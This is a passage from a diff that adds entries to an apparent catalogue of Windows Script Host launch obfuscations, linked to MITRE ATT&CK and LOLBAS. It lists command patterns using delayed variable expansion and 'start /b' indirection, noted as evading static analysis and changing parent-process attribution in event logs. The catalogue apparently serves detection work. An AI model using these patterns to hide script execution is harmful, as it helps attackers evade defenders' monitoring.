+        "Pattern": "cmd /v:on /c \"set x=wscript& !x! script.vbs\"",
+        "Wildcards": [],
+        "Notes": "Delayed variable expansion \u2014 /v:on enables !var! syntax; !x! resolves at runtime only, invisible to parse-time static analysis",
+        "Method": "Delayed expansion"
+      },
+      {
+        "Pattern": "for /f %i in ('where ws?ript.exe') do start \"\" /b %i script.vbs",
+        "Wildcards": [
+          "?"
+        ],
+        "Notes": "start /b launches wscript.exe as a detached background process \u2014 changes parent process attribution in event logs",
+        "Method": "start indirection"
+      }
+    ],
+    "PlatformNotes": "wscript.exe runs scripts silently (no console window), making it useful for stealthy execution. cscript.exe is the console counterpart. Both share the Windows Script Host engine and accept the same script formats.\n",
+    "Resources": [
+      "https://attack.mitre.org/techniques/T1059/005/",
+      "https://lolbas-project.github.io/lolbas/Binaries/Wscript/"
+    ]
+  }
+]
